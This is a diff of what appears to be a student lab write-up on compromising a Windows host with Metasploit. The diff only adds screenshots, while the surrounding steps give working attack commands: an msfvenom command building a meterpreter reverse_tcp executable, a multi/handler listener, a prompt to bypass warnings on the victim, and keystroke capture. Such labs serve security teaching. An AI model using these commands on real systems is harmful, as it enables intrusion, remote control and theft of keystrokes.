@@ -63,12 +63,14 @@ Find the attackers ip address using ifconfig
 
 ### Output:
 
+<img width="887" height="394" alt="image" src="https://github.com/user-attachments/assets/179f0ec1-4d86-4e17-a423-f77fd3030f41" />
 
 
 Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```
 
 ### Output:
 
+<img width="798" height="449" alt="image" src="https://github.com/user-attachments/assets/65e8c2d0-f600-4426-aa1c-8062819ad8b2" />
 
 
 copy the fun.exe into the apache ```/var/www/html ```folder
@@ -89,6 +91,7 @@ Type help or a question mark "?" to see the list of all available commands you c
 Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
 
 ### Output 
+<img width="1224" height="905" alt="image" src="https://github.com/user-attachments/assets/322eb791-b345-47d1-acb3-f099f5432c71" />
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
@@ -98,6 +101,7 @@ On the target Windows machine, open a Web browser and open this URL, replacing t
 Bypass any warning boxes, double-click the file, and allow it to run.
 On kali give the command exploit
 
+<img width="897" height="763" alt="image" src="https://github.com/user-attachments/assets/b8ca6871-b83b-41df-b1c1-3aeb8d0518b7" />
 
 
 To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
@@ -112,9 +116,10 @@ The target is now owned. Following are meterpreter commands for key capturing in
 
 
 keyscan_dump Shows the keystrokes captured so far
+<img width="1435" height="335" alt="image" src="https://github.com/user-attachments/assets/c0ac4b71-08dd-482c-9041-42073446cc6e" />
+
 
 
 
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
-
